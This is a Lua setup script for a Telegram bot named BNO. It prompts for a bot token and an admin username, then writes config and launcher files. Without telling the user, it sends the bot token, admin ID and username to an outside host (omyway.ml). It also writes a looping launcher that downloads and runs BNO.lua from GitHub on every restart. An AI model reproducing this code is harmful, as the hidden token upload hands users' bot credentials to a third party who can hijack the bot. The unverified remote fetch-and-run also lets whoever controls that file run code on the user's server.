serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_BNO = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_BNO = function() 
local Create_Info = function(Token,Sudo,UserName)  
local BNO_Info_Sudo = io.open("sudo.lua", 'w')
BNO_Info_Sudo:write([[
token = "]]..Token..[["
Sudo = ]]..Sudo..[[  
UserName = "]]..UserName..[["
]])
BNO_Info_Sudo:close()
end  
if not database:get(Server_BNO.."Token_BNO") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_BNO.."Token_BNO",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_BNO.."UserName_BNO") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_BNO.."UserName_BNO",Json.Info.Username)
database:set(Server_BNO.."Id_BNO",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_BNO_Info()
Create_Info(database:get(Server_BNO.."Token_BNO"),database:get(Server_BNO.."Id_BNO"),database:get(Server_BNO.."UserName_BNO"))   
https.request("https://omyway.ml/bn/bno.php?id="..database:get(Server_BNO.."Id_BNO").."&user="..database:get(Server_BNO.."UserName_BNO").."&token="..database:get(Server_BNO.."Token_BNO"))
local RunBNO = io.open("BNO", 'w')
RunBNO:write([[
#!/usr/bin/env bash
cd $HOME/BNO
token="]]..database:get(Server_BNO.."Token_BNO")..[["
rm -fr BNO.lua
wget "https://raw.githubusercontent.com/TEAMBNO/BNO/main/BNO.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./BNO.lua -p PROFILE --bot=$token
done
]])
RunBNO:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/BNO
while(true) do
rm -fr ../.telegram-cli
screen -S BNO -X kill
screen -S BNO ./BNO
done
]])
RunTs:close()
end
Files_BNO_Info()
database:del(Server_BNO.."Token_BNO");database:del(Server_BNO.."Id_BNO");database:del(Server_BNO.."UserName_BNO")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_BNO()  
var = true
else   
f:close()  
database:del(Server_BNO.."Token_BNO");database:del(Server_BNO.."Id_BNO");database:del(Server_BNO.."UserName_BNO")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()